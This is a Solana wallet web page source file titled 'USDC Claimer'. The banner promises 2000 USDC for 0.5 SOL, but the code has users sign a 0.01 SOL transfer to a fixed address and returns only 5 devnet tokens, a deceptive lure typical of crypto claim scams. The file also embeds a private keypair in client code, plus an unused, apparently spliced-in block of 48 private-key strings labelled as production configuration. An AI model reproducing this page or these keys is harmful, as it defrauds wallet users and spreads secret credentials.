/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "498wzCyKJ5TKcu62mFQGSRn4Aydko3Ubuh5ivrGtXekZdfKbW7pjBvcgnJQjAUZW78YBNfgd1wNhZnMcVK7818T8"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "3kJtKWGWX8AmVoGCBpPcnUW2bZQW6FE2trF3qPETkNzbFwjrigaTXwk8QqbJ6cushnqMnPm416rhVqyZPVhgnafL",
  "key1": "2Xka6hYJLMB3zpmk4SDBy9gh75ffoARdqN9rDPopmQXAGByaSXUqbFnjSVHNUxBgk88hnxNiWFsWG58r5cV9BiY",
  "key2": "265YGEPTm6eCorf2Scss6FTVkWiaWUaHM4Xf419DZBS8tWEiq5JMnKZEN8h4SfnwCHi8LAUj33169UDMB1Tap5ay",
  "key3": "4vQg3jUh6KW2nxoWcZwyq6sULSaMEUuWcEPyEaHn4ptdsywrDzvZp857gQF8gXnM4rVknYkoxyg4nBMRBbGJqh4a",
  "key4": "2uejMBgeLfUkrRt8W2g5t6tYNJTEd3x1ZbGPJoKdSvFPBFwAFmJob1fe2C5MYmRb9HaQswzEZpPLPkM4DSLrrfS9",
  "key5": "3jS8uCbXbeTQso83VUyfsgBWaZNoK3Q139ZTFJpxtQ5MtBpqeQ68xV481sitEgtnZYjMq8VfL4ZR3ki6xigE3AAx",
  "key6": "5zULAN9paGfv6MDGpWtt4BdF63sECWcaTkMgudKdcVfAYBe877LLNsSzDcot5eGn86p3NJvsVaKGDbHnuShJwnd2",
  "key7": "57wyvgg7qsPbKTLe2N3wUnQa4rX2AiQLhT1hVy6dpLhGqXNkTeLJzSByz3mAcn13Z1nk8sZNZHZiwv4jXf3GRLny",
  "key8": "3QEM28Mu3Zee17vnJKcxrnrAf2gHQAh6TB7aGPwSaHakyHP9im1wBwwZHa8wUFUdGvuZLdg6G9EKVC9sMsmnRUPy",
  "key9": "5Gs9fxtiSTF9oPyV4kQCSJzLzcVo83ebmBjeaHK94zak8K7GDz1wbcMpuxqrXhtDUUXgPJNtfXzz7fq96H8X58Vu",
  "key10": "5JXkxfhRAo1V3M5vRgF5fuK88SpzrTNLnL74Xv65ex7NnBXbTMujw7gnTvSDcYo7bJcThheoC1tGJL3iZ3HueKm",
  "key11": "qZNA43RvoZCJ8D8xPoHekoxLKK2YWmcoF3454L7v12npMZ4n2BagWBrVcgyRaUJgDp4bMzjsjyEWP5uBfuBidJQ",
  "key12": "4mLJteW5mgeyYCvtDXGUCU9z48qVgoc1oZpTFyJuFzvuFeiKw83MDVBWv8NwHS8Wgpf9NxTED6nUvjNJubvwHyNs",
  "key13": "2cqXP47JYngK2Mn933AUbpLo3Qcz13GSYZ4XNgXAzcUKcoAw8tWZwdkSZqaz18tjKAnJ2Jj8cjmjPyNyhdQ9ueHC",
  "key14": "2RbZ7AeEX1oyz4FM2JJCvCYZub3wJjTpFuzseYEK4Kx23KWAMmkUsNpsppXeiGcFnsHifSVYqSJVwu9ATyfwT13z",
  "key15": "5rdo1A3oxWxmkVAV9QfLFnBoUMo7CwkQNF837QzzCjB5hC2w1bgDVSxEk9XfL8t5JNHqFM84Fd5ngEUj2ctVtfFU",
  "key16": "54vrXcuAJ3UsoiQSBf1Y6Xa82fLAP4LGhT4UF1S6gjrCc663AMLMdnHAzJLnNE1XEwo2x3U4KNVteDZhVjqn187Y",
  "key17": "3iBxAXuYDytpyJgEjWEVyotaA6QMX2fqxtUDJCtoKDMezw7DnzNaxgN4LDWoeQ6cNR9SYB7eJwd7YxN7Evp2YygR",
  "key18": "CXTjtKoEuEsGnxUWWCWbaURiFmTksAsarBSXnxqAmGLuyW33WqLXaZk75cZ2G5kAcxYJpm3vAg4KzbQuDYd7sCB",
  "key19": "57Si2cFQ864GxHjQTAPp2hGGghCB66CJHBLSFtB9ZDMjiJkD2o9UFMbnkhxnsbQezXMcg3MCWLugFwTg8kA2yjzE",
  "key20": "3qzURUYizDj8LfE6VE2kKqJJgW3zY42fHsQq4mJ7nw1cWFgAuVk23bkrJnARtKgUJRbKCq2gm9ESeShjUSn4Ei3x",
  "key21": "22365sREqsQEL7YSSjh8XKMoSGGMmX2VJLaYwp49SSqpra3ByatmpfQ9LZgn5TZ3ZfKkRTV6sddM6qk1tezEKDWH",
  "key22": "4pC1kFWrKroWkMpn8SCaW4vEuCGFBRo756tNoD2J4M94G6YnRzsJBQnF8JK4UXyBe18zDVJEPQu9a9foHHjF27EB",
  "key23": "2CHKa6UsFAihfRQzgAqeRGnKXtpLXsMCywA3ZQampz4MgozQMcNK2xN385NbwAvFBdCEoTthYppRJEz3GvgZ1wDm",
  "key24": "5S7M78iKvHPUsyJgKvsqrCTkerwjppRYbtZSPHcWidQET2ugLk5HMUBZppzVShoHcCwaTXQhmVrGN98zw9uFsCb2",
  "key25": "uYsjF3tAo3njK4CUvqNBDTSLXPXFB5T6RPMveLyJdE3nNScDkfSVGAvhiBzRPFabxv1yQKQqk6Tp3PsvFs9uow4",
  "key26": "3injXBhVAXFfh6nHjjDV8yHXJxd4J148YqbZBFpBLNLzpdtKVxttRdfYbfQQrHn2v1CWfvhTLhspD84D8omDmh5N",
  "key27": "3rup2eaYHi2VHz7TeYhC14USMTGnSnpvrx3tgCmBJ6gvVuvPWW6we2vxY5Tbp9XJ2uBpTkcsx8ency4YbBN5oZDH",
  "key28": "3RQLft3AWE8Lixv3BZY7PyBx7XWm7ggeeJNRh9cUYJi1bGNTSGAvTJaju1URZA1ZL9zMCqYbE2vqBQCHsHW27wpe",
  "key29": "3SWspuaEWcd16W8FfM7Vojgz3q9jC3bER5df4CuyczXHqnKtKvbJTCpR55WdUDrUkc6WYgTCEGSvg2bM7yamBSd2",
  "key30": "dbGfT5LhNKoeRNL5KYZajfpg9KVmeS8aXdzFawd84aNPNLM14yChUZYqBEhdjAJLfwPZattqBqtAjku6z4VUKHF",
  "key31": "3VEhRXbf2HuPHYr7RUHgmrwy1QddjvVKNi8b7GT3M1dE89Kb8ipwPGYxoAKHSVv6bQBmLbu8nxaKoZBR6ZQaRktP",
  "key32": "NkaWpaRyuPx4YFtQxSHbQToXcEhJXTTT5kPq5AxNM7c2wVkohnYoA2s8f5YEeWTct9GF25PAwhNgqBCH6pTMoMJ",
  "key33": "2CPWuQkfikBygExFqraLt2nPQwkEakB6LCXQYwAG9qMgRxc8rfgTzFKjuEJDQRZLuzZ4HBMBszg5ZdFxURtKzfs8",
  "key34": "4yWvEN1Lm2jEXEqxcJ9ULrHJQyj2NEjwEs6tMGNqKKtCouiUzLpA1AjR2q6txXetPEj48Si7VAmMVpHjBV6zMX5j",
  "key35": "ydXphykRJY7hNQjMKjMRxpRGr9NmL8LsATSiYCLKz2s1zB1usMUJUZ5tbuFrptSeRpFT59H68YLLHHfjGVbYMh8",
  "key36": "4L3fZrKH6QCV5env89kdUeEPv9N4do9gs1fDNjuw3TMejcvRMqdnBqUWLTxGoEFbBCgFCoqJvAu9yxNJsesQ9h5V",
  "key37": "5Bx4jwyQ6efqY7CBUHaZw23GKs6APTb54xCVXsNqjxDKpc5SGzLa3tuHr5sFBbxbv5dQTaq3SxNw85vd7CsQY7W1",
  "key38": "zsfbuNKnc8kQjpXSvedoosnpGfsuQVE8nq1NAGBTKpUscu9B9EEaqEKQaabiXwUginhGV4zxwPqN7V5RE3z619T",
  "key39": "sw3KGwz3WKjLPFdxRThxwF5FDQmDbpRPDv7zRRDrPuCNtpUBHTcJ2zJTvTDaZZDgQPYeky3hXhjb8nCKP5GffQg",
  "key40": "3qP1odeGZ5AGU4uSqZuZQJPAQVZCv3M2d7mAvGt626GRZ2Wp4eLdcu3nLuJo1WBrbjgYwfvyhX2KknHMzmSM6buP",
  "key41": "3Xb6HJhwhRZFe9DHiSe6kUB1aTgXMr2YYHwYs3mqhGU1ttMKqUNnSNM8ysKidwSf9sHsTKTqwFhjWsmuJyjgpa5s",
  "key42": "xWfTkvrUw33uUwGFpiWF97KGhyMQjeqR8yWdEQYuVv5Qpd4SGvmAaPRGspWVGGidvP42rdryTTFKPEwTiVpBDPZ",
  "key43": "3Ze3JsQkhV2MgCKTvjRfHL9oQ4rPLVSctUpLHXFbwfRBfjF8kMrm7ZFym8xyWyf6MumJSxLCvJWYLc2CoSBLcXBV",
  "key44": "5myYGmm1sGLvaWxrGezWBDpRJ4wdFqKG7GGo1VPqHKXeDXVvVxnq8TiczjbxjkKiSMLQo32DL6ptihTrdw8eB8qM",
  "key45": "55JQCq91miuRFfyXDW87mj5V15x46UibjSiPY5Jo7QuLps2CWJ7iVQBokJpky4pTt1H4KW7oHkth9U17TknQvUUt",
  "key46": "4CnXotX6V827RLJPTB3BTYMK6NNYzStHGf4F5PAj4H9ZycPt11EHdwJmL2pUyGTWbiTexmvyifFiDbMZowAhL92Y",
  "key47": "3hYWC9EYJVZRtvAZcuDNAzsqdX3Ko3FemwXJbrqcopxaWHB8YrLTpj82ss4BPPbvdHSv5inZvipYErRSLwZ7NHwq"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
